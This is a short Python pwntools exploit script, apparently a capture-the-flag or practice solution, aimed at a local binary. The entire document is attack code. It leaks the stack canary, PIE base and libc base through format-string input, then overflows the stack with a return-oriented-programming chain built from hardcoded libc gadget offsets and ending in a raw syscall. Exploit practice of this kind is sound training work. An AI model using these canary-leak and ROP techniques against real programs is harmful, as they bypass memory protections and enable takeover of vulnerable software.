from pwn import *

e = ELF("./a.out")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

#Stack canary en 11
#Pie offset 0x1270 en 18
#Libc offset 0x10e0a7 en 3

io = e.process()

io.sendline(b"%11$lx-%18$lx")
io.recvline()
leak = io.recvline().strip()

canary = int(leak.split(b'-')[0], 16)
pie = int(leak.split(b'-')[1], 16) - 0x1270

log.info("Canary: %s" % hex(canary))
log.info("Pie: %s" % hex(pie))

payload = (
    b"A"*24+
    p64(canary)+
    b"B"*8+
    p64(pie + e.sym['main'])
)

io.sendline(payload)
io.recvline()
########### 2da vuelta #########
io.sendline(b"%3$lx")
io.recvline()

leak = io.recvline().strip()
libc.address = int(leak, 16) - 0x10e0a7
print("Libc: %s" % hex(libc.address))

payload = (
    b"A"*24+
    p64(canary)+
    b"B"*8+
    p64(libc.address + 0x0019755d)+ #pop rdi, ret
    p64(0x1)+
    p64(libc.address + 0x00196dc0)+ #pop rsi, ret
    p64(next(libc.search(b'/bin/sh')))+
    p64(libc.address + 0x0015fd17)+ #pop rax, rdx, rbx, ret
    p64(0x1)+
    p64(0x9)+
    p64(0xdeadbeef)+
    p64(libc.address + 0x001989b6) #syscall
)

io.sendline(payload)
io.interactive()
io.close()